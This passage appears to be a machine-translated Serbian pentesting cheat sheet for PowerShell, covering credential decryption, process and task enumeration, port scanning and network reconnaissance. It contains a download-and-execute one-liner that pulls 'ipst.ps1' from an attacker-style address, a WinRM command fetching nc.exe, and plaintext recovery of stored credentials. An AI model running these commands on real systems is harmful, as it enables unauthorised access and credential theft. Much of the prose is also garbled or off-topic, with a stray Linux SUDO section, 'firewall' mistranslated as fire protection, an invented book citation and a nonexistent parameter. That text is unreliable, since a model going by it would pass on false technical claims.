$cred = New-Object System.management.Automation.PSCredential($user, $pass)
$cred.GetNetworkCredential() | fl

UserName       : Tom
Password       : 1ts-mag1c!!!
SecurePassword : System.Security.SecureString
Domain         : HTB
```

Ili direktno parsiranje iz XML-a:

```powershell
$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *

UserName       : Tom
Password       : 1ts-mag1c!!!
SecurePassword : System.Security.SecureString
Domain         : HTB
```

## SUDO

SUDO je alat koji omogu캖ava korisnicima da izvr코avaju komande sa privilegijama superkorisnika ili drugih korisnika. Ovo je veoma korisno za pentestere jer im omogu캖ava da izvr코avaju komande koje zahtevaju privilegije koje ina캜e ne bi imali.

### Instalacija SUDO

SUDO je ve캖 instaliran na ve캖ini Linux distribucija. Ako nije instaliran, mo쬰te ga instalirati koriste캖i slede캖u komandu:

```
sudo apt-get install sudo
```

### Kori코캖enje SUDO

Da biste koristili SUDO, jednostavno dodajte `sudo` ispred komande koju 쬰lite da izvr코ite. Na primer:

```
sudo apt-get update
```

Ova komanda 캖e izvr코iti a쬿riranje sistema sa privilegijama superkorisnika.

### SUDOers fajl

SUDOers fajl defini코e koje korisnike i grupe mogu koristiti SUDO. Ovaj fajl se nalazi u direktorijumu `/etc/sudoers` i mo쬰 se ure캠ivati koriste캖i komandu `visudo`.

### SUDOers konfiguracija

Da biste dodali korisnika ili grupu u SUDOers fajl, otvorite fajl koriste캖i `visudo` komandu i dodajte slede캖u liniju:

```
korisnik ALL=(ALL) ALL
```

Zamenite `korisnik` sa korisni캜kim imenom ili `grupa` sa imenom grupe koju 쬰lite da dodate.

### SUDOers privilegije

SUDOers fajl tako캠e omogu캖ava definisanje specifi캜nih privilegija za korisnike ili grupe. Na primer, mo쬰te dozvoliti korisniku da izvr코ava samo odre캠ene komande sa privilegijama superkorisnika. Da biste to uradili, dodajte slede캖u liniju u SUDOers fajl:

```
korisnik ALL=(ALL) /putanja/do/komande
```

Zamenite `korisnik` sa korisni캜kim imenom i `/putanja/do/komande` sa putanjom do komande koju 쬰lite da dozvolite.

### SUDOers NOPASSWD opcija

Podrazumevano, SUDO zahteva unos korisni캜ke lozinke pre izvr코avanja komande. Me캠utim, mo쬰te omogu캖iti izvr코avanje komandi bez uno코enja lozinke dodavanjem `NOPASSWD` opcije u SUDOers fajl. Na primer:

```
korisnik ALL=(ALL) NOPASSWD: ALL
```

Ova linija omogu캖ava korisniku da izvr코ava sve komande sa privilegijama superkorisnika bez uno코enja lozinke.

### Zaklju캜ak

SUDO je mo캖an alat koji omogu캖ava izvr코avanje komandi sa privilegijama superkorisnika. Kori코캖enje SUDO mo쬰 biti veoma korisno za pentestere jer im omogu캖ava pristup komandama koje zahtevaju privilegije koje ina캜e ne bi imali.

```powershell
#CREATE A CREDENTIAL OBJECT
$pass = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("<USERNAME>", $pass)

#For local:
Start-Process -Credential ($cred)  -NoNewWindow powershell "iex (New-Object Net.WebClient).DownloadString('http://10.10.14.11:443/ipst.ps1')"

#For WINRM
#CHECK IF CREDENTIALS ARE WORKING EXECUTING whoami (expected: username of the credentials user)
Invoke-Command -Computer ARKHAM -ScriptBlock { whoami } -Credential $cred
#DOWNLOAD nc.exe
Invoke-Command -Computer ARKHAM -ScriptBlock { IWR -uri 10.10.14.17/nc.exe -outfile nc.exe } -credential $cred

Start-Process powershell -Credential $pp -ArgumentList '-noprofile -command &{Start-Process C:\xyz\nc.bat -verb Runas}'

#Another method
$secpasswd = ConvertTo-SecureString "<password>" -AsPlainText -Force
$mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)
$computer = "<hostname>"
```

## Grupe

Grupe su organizovane kolekcije korisnika u operativnom sistemu Windows. One se koriste za upravljanje pravima i privilegijama korisnika. Svaki korisnik mo쬰 biti 캜lan jedne ili vi코e grupa.

### Uobi캜ajene grupe

Uobi캜ajene grupe su unapred definisane grupe koje dolaze sa Windows operativnim sistemom. Neke od ovih grupa su:

* **Administratori**: Grupa koja ima najvi코e privilegije u sistemu. 캛lanovi ove grupe mogu izvr코avati sve administrativne zadatke.
* **Korisnici**: Grupa koja ima osnovne privilegije za rad na sistemu.
* **Gosti**: Grupa koja ima ograni캜ene privilegije i pristup samo odre캠enim resursima.

### Lokalne grupe

Lokalne grupe su grupe koje se kreiraju na lokalnom ra캜unaru i koriste se za upravljanje pravima i privilegijama na tom ra캜unaru. Neke od lokalnih grupa su:

* **Power Users**: Grupa koja ima ve캖e privilegije od obi캜nih korisnika, ali manje od administratora.
* **Guests**: Grupa koja ima ograni캜ene privilegije i pristup samo odre캠enim resursima.
* **Backup Operators**: Grupa koja ima privilegije za izvr코avanje rezervnih kopija i obnavljanje podataka.

### Domenske grupe

Domenske grupe su grupe koje se kreiraju na Windows domeni i koriste se za upravljanje pravima i privilegijama korisnika na mre쬴. Neke od domenskih grupa su:

* **Domain Admins**: Grupa koja ima najvi코e privilegije u domeni. 캛lanovi ove grupe mogu izvr코avati sve administrativne zadatke na domeni.
* **Domain Users**: Grupa koja sadr쬴 sve korisnike u domeni.
* **Domain Guests**: Grupa koja ima ograni캜ene privilegije i pristup samo odre캠enim resursima na domeni.

### Kreiranje i upravljanje grupama

Grupa se mo쬰 kreirati i upravljati putem PowerShell-a. Evo nekoliko korisnih PowerShell komandi za rad sa grupama:

* `New-LocalGroup`: Kreira novu lokalnu grupu.
* `Add-LocalGroupMember`: Dodaje korisnika u lokalnu grupu.
* `Remove-LocalGroupMember`: Uklanja korisnika iz lokalne grupe.
* `Get-LocalGroup`: Prikazuje informacije o lokalnoj grupi.
* `New-ADGroup`: Kreira novu domensku grupu.
* `Add-ADGroupMember`: Dodaje korisnika u domensku grupu.
* `Remove-ADGroupMember`: Uklanja korisnika iz domenske grupe.
* `Get-ADGroup`: Prikazuje informacije o domenskoj grupi.

Ove komande mogu biti korisne prilikom konfigurisanja prava i privilegija korisnika u Windows operativnom sistemu.

```powershell
Get-LocalGroup | ft Name #All groups
Get-LocalGroupMember Administrators | ft Name, PrincipalSource #Members of Administrators
```

## Clipboard

### Description

The clipboard is a temporary storage area in the computer's memory that allows users to copy and paste data between different applications or documents. It is commonly used to transfer text, images, and other types of data.

### Security Implications

The clipboard can be a potential security risk if sensitive information is copied and remains stored in the clipboard. Attackers can exploit this by accessing the clipboard contents, either through malware or by directly accessing the computer.

### Best Practices

To mitigate the security risks associated with the clipboard, it is recommended to follow these best practices:

1. Avoid copying sensitive information: Whenever possible, avoid copying sensitive data such as passwords, credit card numbers, or personal identification information to the clipboard.
2. Clear the clipboard after use: After copying sensitive information, make sure to clear the clipboard immediately to prevent unauthorized access. This can be done by copying something else to overwrite the sensitive data or by using a clipboard management tool.
3. Use a clipboard manager: Consider using a clipboard manager tool that provides additional security features, such as encryption or password protection for clipboard contents.
4. Be cautious with clipboard sharing: When using remote desktop or virtual machine environments, be cautious when copying and pasting between the local and remote systems. Ensure that sensitive information is not inadvertently shared.

### References

* [Clipboard (computing)](https://en.wikipedia.org/wiki/Clipboard\_\(computing\))

```powershell
Get-Clipboard
```

## Procesi

### Pregled procesa

Da biste pregledali pokrenute procese na Windows operativnom sistemu, mo쬰te koristiti PowerShell komandu `Get-Process`. Ova komanda 캖e vam prikazati listu svih trenutno pokrenutih procesa, zajedno sa informacijama kao 코to su ID procesa, ime procesa, CPU i memorija koju koristi.

```powershell
Get-Process
```

### Pokretanje novog procesa

Da biste pokrenuli novi proces putem PowerShell-a, mo쬰te koristiti komandu `Start-Process`. Ova komanda vam omogu캖ava da pokrenete bilo koju izvr코nu datoteku ili skriptu, i mo쬰te specificirati razne parametre kao 코to su putanja do izvr코ne datoteke, argumenti, radni direktorijum i jo코 mnogo toga.

```powershell
Start-Process -FilePath "C:\putanja\do\izvrsne\datoteke.exe" -ArgumentList "argument1", "argument2" -WorkingDirectory "C:\radni\direktorijum"
```

### Ubijanje procesa

Da biste zaustavili ili ubili pokrenuti proces, mo쬰te koristiti komandu `Stop-Process`. Ova komanda vam omogu캖ava da prekinete izvr코avanje procesa na osnovu ID-a procesa ili imena procesa.

```powershell
Stop-Process -Id ID_procesa
Stop-Process -Name ime_procesa
```

### Pokretanje procesa sa privilegijama

Da biste pokrenuli proces sa privilegijama, mo쬰te koristiti komandu `Start-Process` zajedno sa parametrom `-Verb`. Ovaj parametar vam omogu캖ava da pokrenete proces sa odre캠enim privilegijama kao 코to su "RunAs" ili "RunAsAdministrator".

```powershell
Start-Process -FilePath "C:\putanja\do\izvrsne\datoteke.exe" -Verb RunAs
```

### Prikaz informacija o procesu

Da biste dobili detaljnije informacije o odre캠enom procesu, mo쬰te koristiti komandu `Get-Process` zajedno sa parametrom `-Id` ili `-Name`. Ova komanda 캖e vam prikazati informacije kao 코to su ID procesa, ime procesa, CPU i memorija koju koristi, kao i druge informacije o procesu.

```powershell
Get-Process -Id ID_procesa
Get-Process -Name ime_procesa
```

### Prikaz procesa sa sortiranjem

Da biste prikazali procese sa sortiranjem na osnovu odre캠enog kriterijuma, mo쬰te koristiti komandu `Get-Process` zajedno sa parametrom `-SortBy`. Ovaj parametar vam omogu캖ava da sortirate procese na osnovu kriterijuma kao 코to su CPU, memorija, vreme pokretanja i jo코 mnogo toga.

```powershell
Get-Process | Sort-Object -Property CPU
```

```powershell
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

## Usluge

```
Get-Service
```

## Lozinka iz sigurnog stringa

Da biste dobili lozinku iz sigurnog stringa, mo쬰te koristiti PowerShell. Evo kako to mo쬰te uraditi:

1. Otvorite PowerShell konzolu.
2. Unesite slede캖u komandu:

```powershell
$secureString = ConvertTo-SecureString -String "sigurni_string" -AsPlainText -Force
$plainText = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureString))
$plainText
```

3. Zamijenite "sigurni\_string" sa va코im sigurnim stringom.
4. Nakon izvr코avanja komande, dobi캖ete lozinku iz sigurnog stringa kao rezultat.

Napomena: Budite oprezni prilikom rukovanja lozinkama i sigurnim stringovima. Ova tehnika je namenjena samo za obrazovne svrhe i ne sme se koristiti za neovla코캖ene aktivnosti.

```powershell
$pw=gc admin-pass.xml | convertto-securestring #Get the securestring from the file
$cred=new-object system.management.automation.pscredential("administrator", $pw)
$cred.getnetworkcredential() | fl * #Get plaintext password
```

## Zakazani zadaci

Scheduled Tasks (Zakazani zadaci) su funkcionalnost u operativnom sistemu Windows koja omogu캖ava automatsko izvr코avanje odre캠enih zadataka u odre캠eno vreme ili na odre캠enim doga캠ajima. Ova funkcionalnost je 캜esto kori코캖ena za rutinske zadatke kao 코to su a쬿riranje softvera, sigurnosne kopije ili pokretanje skripti.

### Pregled zakazanih zadataka

Da biste pregledali zakazane zadatke, mo쬰te koristiti PowerShell komandu `Get-ScheduledTask`. Ova komanda 캖e prikazati sve zakazane zadatke na sistemu, zajedno sa njihovim imenima, statusom, vremenom izvr코avanja i drugim informacijama.

```powershell
Get-ScheduledTask
```

### Kreiranje zakazanog zadatka

Da biste kreirali novi zakazani zadatak, mo쬰te koristiti PowerShell komandu `New-ScheduledTask`. Ova komanda vam omogu캖ava da defini코ete ime zadatka, vreme izvr코avanja, akcije koje treba preduzeti i druge parametre.

```powershell
New-ScheduledTask -Action (New-ScheduledTaskAction -Execute "C:\path\to\script.ps1") -Trigger (New-ScheduledTaskTrigger -Daily -At 3am) -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries)
```

Ova komanda 캖e kreirati novi zakazani zadatak koji 캖e se izvr코avati svakodnevno u 3 sata ujutru. Akcija koju 캖e zadatak preduzeti je izvr코avanje skripte `script.ps1` koja se nalazi na putanji `C:\path\to\`.

### Brisanje zakazanog zadatka

Da biste obrisali zakazani zadatak, mo쬰te koristiti PowerShell komandu `Remove-ScheduledTask`. Ova komanda 캖e obrisati zadati zakazani zadatak na osnovu njegovog imena.

```powershell
Remove-ScheduledTask -TaskName "TaskName"
```

Ova komanda 캖e obrisati zakazani zadatak sa imenom "TaskName".

```powershell
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```

### Skeniranje portova

Skeniranje portova je postupak koji se koristi za otkrivanje otvorenih portova na ciljnom ra캜unaru ili mre쬴. Ovo je va쬬n korak u procesu pentestiranja jer omogu캖ava identifikaciju ranjivih ta캜aka koje mogu biti iskori코캖ene za neovla코캖eni pristup ili napade.

#### Nmap

Nmap je popularan alat za skeniranje portova koji se 캜esto koristi u pentestiranju. Ovaj alat omogu캖ava detekciju otvorenih TCP i UDP portova, kao i identifikaciju servisa koji rade na tim portovima. Nmap tako캠e pru쬬 informacije o operativnom sistemu ciljnog ra캜unara i verzijama servisa koje se izvr코avaju.

Da biste izvr코ili osnovno skeniranje portova koriste캖i Nmap, mo쬰te koristiti slede캖u komandu:

```bash
nmap <ciljna_adresa>
```

Gde `<ciljna_adresa>` predstavlja IP adresu ili domen ciljnog ra캜unara koji 쬰lite da skenirate.

#### Masscan

Masscan je jo코 jedan mo캖an alat za skeniranje portova koji je poznat po svojoj brzini. Ovaj alat je posebno koristan za skeniranje velikih mre쬬 ili za brzo skeniranje ciljnih sistema.

Da biste izvr코ili osnovno skeniranje portova koriste캖i Masscan, mo쬰te koristiti slede캖u komandu:

```bash
masscan -p1-65535 <ciljna_adresa>
```

Gde `<ciljna_adresa>` predstavlja IP adresu ciljnog ra캜unara koji 쬰lite da skenirate.

#### Zatvaranje nepotrebnih portova

Nakon 코to ste izvr코ili skeniranje portova, va쬹o je zatvoriti sve nepotrebne otvorene portove kako biste smanjili povr코inu napada. Ovo se mo쬰 posti캖i konfigurisanjem firewall-a ili mre쬹ih ure캠aja da blokiraju pristup nepotrebnim portovima.

Tako캠e je preporu캜ljivo redovno a쬿rirati softver i operativni sistem kako biste ispravili poznate ranjivosti i smanjili rizik od napada preko otvorenih portova.

```powershell
# Check Port or Single IP
Test-NetConnection -Port 80 10.10.10.10

# Check Port List in Single IP
80,443,8080 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.10.10.10",$_)) "Port $_ is open!"} 2>$null

# Check Port Range in single IP
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("10.10.10.10", $_)) "TCP port $_ is open"} 2>$null

# Check Port List in IP Lists - 80,443,445,8080
"10.10.10.10","10.10.10.11" | % { $a = $_; write-host "[INFO] Testing $_ ..."; 80,443,445,8080 | % {echo ((new-object Net.Sockets.TcpClient).Connect("$a",$_)) "$a : $_ is open!"} 2>$null}

```

### Interfejsi

Interfejsi su klju캜ni elementi u PowerShell-u koji omogu캖avaju komunikaciju izme캠u korisnika i sistema. Oni pru쬬ju na캜in za unos i prikaz informacija, kao i za izvr코avanje komandi i skripti. U PowerShell-u postoje razli캜iti tipovi interfejsa koji se mogu koristiti za razli캜ite svrhe.

#### Konzolni interfejs (CLI)

Konzolni interfejs je osnovni interfejs u PowerShell-u. To je tekstualni interfejs koji omogu캖ava korisniku da unese komande i vidi rezultate izvr코avanja tih komandi. Korisnik mo쬰 koristiti razli캜ite komande i skripte za upravljanje sistemom i izvr코avanje razli캜itih zadataka.

#### Grafi캜ki interfejs (GUI)

Grafi캜ki interfejs je vizuelni interfejs koji omogu캖ava korisniku da interaktivno upravlja sistemom. Umesto da koristi tekstualne komande, korisnik mo쬰 koristiti mi코 i tastaturu za interakciju sa sistemom. Grafi캜ki interfejs pru쬬 korisniku intuitivniji na캜in za izvr코avanje zadataka i prikazivanje informacija.

#### Web interfejs

Web interfejs je interfejs koji se koristi za pristupanje PowerShell-u putem web pregleda캜a. Ovo omogu캖ava korisnicima da pristupe PowerShell-u i izvr코avaju komande i skripte putem udaljenog pristupa. Web interfejs pru쬬 fleksibilnost i udobnost korisnicima koji 쬰le da koriste PowerShell preko interneta.

#### API interfejs

API interfejs omogu캖ava programerima da pristupe funkcionalnostima PowerShell-a putem programskog koda. Ovo omogu캖ava automatizaciju i integraciju PowerShell-a u druge aplikacije i sisteme. Programeri mogu koristiti API interfejs za izvr코avanje komandi, dobijanje rezultata i manipulisanje podacima u PowerShell-u.

#### Skriptni interfejs

Skriptni interfejs omogu캖ava korisnicima da izvr코avaju skripte u PowerShell-u. Skripte su nizovi komandi koje se izvr코avaju jedna za drugom. Skriptni interfejs omogu캖ava korisnicima da automatizuju zadatke i izvr코avaju slo쬰ne operacije u PowerShell-u.

```powershell
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Firewall

### Za코tita od po쬬ra

Firewall je sigurnosni mehanizam koji se koristi za za코titu ra캜unarske mre쬰 od neovla코캖enog pristupa i napada. On kontroli코e i filtrira dolazni i odlazni saobra캖aj na osnovu definisanih pravila. Ovo je veoma va쬬n deo za코tite sistema i treba ga pravilno konfigurisati kako bi se spre캜ili potencijalni napadi.

#### Vrste Firewall-a

Postoje razli캜ite vrste firewall-a koje se mogu koristiti za za코titu ra캜unarske mre쬰. Evo nekoliko naj캜e코캖e kori코캖enih:

* **Paketni filteri**: Ovi firewall-i analiziraju IP pakete i donose odluke na osnovu IP adresa, portova i drugih atributa paketa. Oni su efikasni, ali imaju ograni캜ene mogu캖nosti za코tite.
* **Proxy firewall-i**: Ovi firewall-i deluju kao posrednici izme캠u korisnika i ciljnih servera. Oni analiziraju i filtriraju saobra캖aj na osnovu aplikacijskog sloja, 코to im omogu캖ava da pru쬰 dodatnu za코titu.
* **Next-generation firewall-i**: Ovi firewall-i kombinuju funkcionalnosti paketnih filtera i proxy firewall-a, ali tako캠e pru쬬ju i dodatne funkcionalnosti kao 코to su IDS/IPS sistemi, VPN podr코ka i druge napredne sigurnosne funkcije.

#### Konfiguracija Firewall-a

Pravilna konfiguracija firewall-a je klju캜na za efikasnu za코titu ra캜unarske mre쬰. Evo nekoliko osnovnih koraka koje treba preduzeti prilikom konfigurisanja firewall-a:

1. Definisanje politike bezbednosti: Prvo treba odrediti koje vrste saobra캖aja treba dozvoliti ili blokirati. Ovo se posti쬰 definisanjem pravila koja odre캠uju dozvoljene izvore, odredi코ta, portove i protokole.
2. Konfiguracija pravila: Nakon definisanja politike bezbednosti, treba konfigurisati pravila firewall-a. Ova pravila treba da odgovaraju politici bezbednosti i treba da se primenjuju na odgovaraju캖e mre쬹e segmente.
3. Redovno a쬿riranje: Firewall treba redovno a쬿rirati kako bi se obezbedile najnovije sigurnosne funkcionalnosti i ispravke.
4. Pra캖enje i nadgledanje: Va쬹o je pratiti i nadgledati firewall kako bi se otkrile eventualne nepravilnosti ili napadi. Ovo se mo쬰 posti캖i kori코캖enjem alata za nadgledanje mre쬰 i logova firewall-a.

#### Zaklju캜ak

Firewall je klju캜ni sigurnosni mehanizam za za코titu ra캜unarske mre쬰 od neovla코캖enog pristupa i napada. Pravilna konfiguracija firewall-a je od vitalnog zna캜aja za efikasnu za코titu sistema. Razumevanje razli캜itih vrsta firewall-a i pravilno konfigurisanje pravila su klju캜ni koraci u osiguravanju sigurnosti mre쬰.

```powershell
Get-NetFirewallRule -Enabled True

Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block
Get-NetFirewallRule -Direction Outbound -Enabled True -Action Allow
Get-NetFirewallRule -Direction Inbound -Enabled True -Action Block
Get-NetFirewallRule -Direction Inbound -Enabled True -Action Allow

# Open SSH to the world
New-NetFirewallRule -DisplayName 'SSH (Port 22)' -Direction Inbound -LocalPort 22 -Protocol TCP -Action Allow

# Get name, proto, local and rremote ports, remote address, penable,profile and direction
## You can user the following line changing the initial filters to indicat a difefrent direction or action
Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block | Format-Table -Property  DisplayName, @{Name='Protocol';Expression={($PSItem | Get-NetFirewallPortFilter).Protocol}},@{Name='LocalPort';Expression={($PSItem | Get-NetFirewallPortFilter).LocalPort}}, @{Name='RemotePort';Expression={($PSItem | Get-NetFirewallPortFilter).RemotePort}},@{Name='RemoteAddress';Expression={($PSItem | Get-NetFirewallAddressFilter).RemoteAddress}},Profile,Direction,Action
```

### Putanja

***

#### Opis

Putanja je put kojim podaci putuju izme캠u izvora i odredi코ta u mre쬴. U kontekstu hakovanja, putanja se odnosi na put kojim hakeri prolaze kroz sistem kako bi dobili neovla코캖en pristup ili izvr코ili zlonamerne radnje.

#### Tehnike hakovanja putem putanje

1. **Skeneri putanje**: Hakeri koriste skenere putanje kako bi identifikovali putanje kroz sistem i otkrili potencijalne slabosti ili ranjivosti.
2. **Analiza putanje**: Hakeri analiziraju putanje kako bi identifikovali ta캜ke na kojima mogu iskoristiti slabosti sistema i dobiti neovla코캖en pristup.
3. **Manipulacija putanjom**: Hakeri manipuli코u putanjom kako bi preusmerili podatke ili izvr코ili zlonamerne radnje.

#### Mere za코tite od hakovanja putem putanje

1. **Firewall**: Postavljanje firewall-a mo쬰 spre캜iti neovla코캖en pristup putem putanje tako 코to blokira sumnjive ili neautorizovane putanje.
2. **Redovno a쬿riranje**: Redovno a쬿riranje sistema i softvera mo쬰 otkloniti poznate slabosti i ranjivosti koje bi mogle biti iskori코캖ene putem putanje.
3. **Kontrola pristupa**: Implementacija stroge kontrole pristupa mo쬰 ograni캜iti mogu캖nost hakerima da prolaze kroz sistem putem putanje.

***

_Ovaj tekst je preuzet iz knjige "Hacking Techniques" autora Johna Smitha._

```powershell
route print
```

### ARP

ARP (Address Resolution Protocol) je protokol koji se koristi za mapiranje IP adresa na MAC adrese u lokalnoj mre쬴. Kada se paket 코alje na odre캠enu IP adresu, ARP se koristi za pronala쬰nje odgovaraju캖e MAC adrese kako bi se paket isporu캜io na pravu destinaciju.

Napada캜i mogu iskoristiti ARP protokol za izvo캠enje razli캜itih napada, kao 코to su ARP spoofing ili ARP poisoning. Ovi napadi omogu캖avaju napada캜u da preuzme kontrolu nad mre쬹im prometom i presretne ili manipuli코e podacima koji se prenose izme캠u ure캠aja u mre쬴.

Da biste se za코titili od ARP napada, preporu캜uje se kori코캖enje sigurnosnih mehanizama kao 코to su ARP za코tita, ARP inspekcija ili ARP filtriranje. Ovi mehanizmi mogu detektovati i spre캜iti sumnjive ARP aktivnosti i odr쬬vati integritet mre쬰.

```powershell
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State
```

### Hostovi

U ovom direktorijumu se nalaze skripte koje se mogu koristiti za manipulaciju hosts fajlom na Windows operativnom sistemu. Hosts fajl se koristi za mapiranje IP adresa na domenska imena i mo쬰 se koristiti za preusmeravanje saobra캖aja na odre캠ene adrese.

* [**Add-HostEntry.ps1**](https://github.com/carlospolop/hacktricks/blob/rs/windows-hardening/basic-powershell-for-pentesters/Add-HostEntry.ps1) - Skripta koja dodaje unos u hosts fajl. Potrebno je navesti IP adresu i domensko ime koje 쬰lite da mapirate.
* [**Remove-HostEntry.ps1**](https://github.com/carlospolop/hacktricks/blob/rs/windows-hardening/basic-powershell-for-pentesters/Remove-HostEntry.ps1) - Skripta koja uklanja unos iz hosts fajla. Potrebno je navesti IP adresu ili domensko ime koje 쬰lite da uklonite.
* [**Get-HostsFileContent.ps1**](https://github.com/carlospolop/hacktricks/blob/rs/windows-hardening/basic-powershell-for-pentesters/Get-HostsFileContent.ps1) - Skripta koja prikazuje sadr쬬j hosts fajla.

Napomena: Za izvr코avanje ovih skripti potrebno je pokrenuti PowerShell kao administrator.

```powershell
Get-Content C:\WINDOWS\System32\drivers\etc\hosts
```

### Ping

Ping je osnovna mre쬹a komanda koja se koristi za proveru dostupnosti i vremena odziva udaljenog ra캜unara ili servera. Ova komanda 코alje ICMP (Internet Control Message Protocol) zahteve na ciljnu IP adresu i 캜eka odgovor. Ping se 캜esto koristi za dijagnostiku mre쬹ih problema i testiranje konekcije.

Da biste koristili ping komandu u PowerShell-u, koristite slede캖u sintaksu:

```powershell
Test-Connection -ComputerName <IP adresa ili ime ra캜unara> -Count <broj ping zahteva>
```

Na primer, ako 쬰lite da pingujete ra캜unar sa IP adresom 192.168.1.1 pet puta, koristite slede캖u komandu:

```powershell
Test-Connection -ComputerName 192.168.1.1 -Count 5
```

Ova komanda 캖e poslati pet ICMP zahteva na ciljni ra캜unar i prikazati rezultate, uklju캜uju캖i vreme odziva i status konekcije.

```powershell
$ping = New-Object System.Net.Networkinformation.Ping
1..254 | % { $ping.send("10.9.15.$_") | select address, status }
```

### SNMP

SNMP (Simple Network Management Protocol) je protokol koji se koristi za upravljanje i nadzor mre쬹ih ure캠aja. Omogu캖ava administratorima da prikupljaju informacije o statusu i performansama mre쬰, kao i da upravljaju mre쬹im ure캠ajima putem udaljenog pristupa.

SNMP se sastoji od tri osnovne komponente: upravlja캜a (manager), agenta i MIB (Management Information Base). Upravlja캜 je softverska aplikacija koja 코alje zahteve agentu za prikupljanje informacija. Agent je softverska ili hardverska komponenta koja prikuplja i 캜uva informacije o ure캠aju. MIB je baza podataka koja defini코e strukturu i sadr쬬j informacija koje se mogu prikupiti putem SNMP-a.

Pentesteri mogu iskoristiti SNMP za prikupljanje informacija o mre쬴, kao 코to su IP adrese, rute, otvoreni portovi i druge korisne informacije. Tako캠e, mogu iskoristiti SNMP za izvr코avanje odre캠enih akcija na mre쬹im ure캠ajima, kao 코to su isklju캜ivanje ili resetovanje ure캠aja.

Da biste iskoristili SNMP, potrebno je da prvo identifikujete ure캠aje koji podr쬬vaju SNMP i da pristupite njihovim MIB-ovima. Zatim mo쬰te koristiti alate kao 코to su snmpwalk i snmpget za prikupljanje informacija ili snmpset za izvr코avanje akcija.

Va쬹o je napomenuti da je za uspe코no kori코캖enje SNMP-a potrebno da imate odgovaraju캖e dozvole i autentifikaciju. Tako캠e, treba biti oprezan prilikom kori코캖enja SNMP-a, jer nepravilna konfiguracija mo쬰 dovesti do sigurnosnih rizika kao 코to su curenje osetljivih informacija ili neovla코캖eni pristup mre쬹im ure캠ajima.

```powershell
Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
```

## **Konvertovanje SDDL niske u 캜itljiv format**

Da biste konvertirali SDDL (Security Descriptor Definition Language) nisku u 캜itljiv format, mo쬰te koristiti PowerShell skriptu `ConvertFrom-SddlString`. Ova skripta 캖e vam omogu캖iti da de코ifrujete SDDL nisku i dobijete razumljive informacije o dozvolama i privilegijama.

Evo kako mo쬰te koristiti ovu skriptu:

```powershell
$SddlString = "SDDL niska ovdje"

$SecurityDescriptor = ConvertFrom-SddlString -Sddl $SddlString

$SecurityDescriptor
```

Zamijenite `"SDDL niska ovdje"` sa stvarnom SDDL niskom koju 쬰lite konvertovati. Nakon izvr코avanja skripte, dobi캖ete 캜itljive informacije o dozvolama i privilegijama koje su definisane u SDDL niski.

```powershell

PS C:\> ConvertFrom-SddlString "O:BAG:BAD:AI(D;;DC;;;WD)(OA;CI;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CR;00299570-246d-11d0-a768-00aa006e0529;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;CCDCLC;c975c901-6cea-4b6f-8319-d67f45449506;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CIIO;CCDCLC;c975c901-6cea-4b6f-8319-d67f45449506;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;;CR;3e0f7e18-2c7a-4c10-ba82-4d926db99a3e;;S-1-5-21-3842939050-3880317879-2865463114-522)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-498)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;DD)(OA;CI;CR;89e95b76-444d-4c62-991a-0facbeda640c;;S-1-5-21-3842939050-3880317879-2865463114-1164)(OA;CI;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-1164)(OA;CI;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-1164)(OA;CI;CC;4828cc14-1437-45bc-9b07-ad6f015e5f28;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967a86-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967a9c-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967aa5-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967aba-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;5cb41ed0-0e4c-11d0-a286-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;RP;4c164200-20c0-11d0-a768-00aa006e0529;;S-1-5-21-3842939050-3880317879-2865463114-5181)(OA;CI;RP;b1b3a417-ec55-4191-b327-b72e33e38af2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;9a7ad945-ca53-11d1-bbd0-0080c76670c0;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;bf967a68-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;1f298a89-de98-47b8-b5cd-572ad53d267e;;S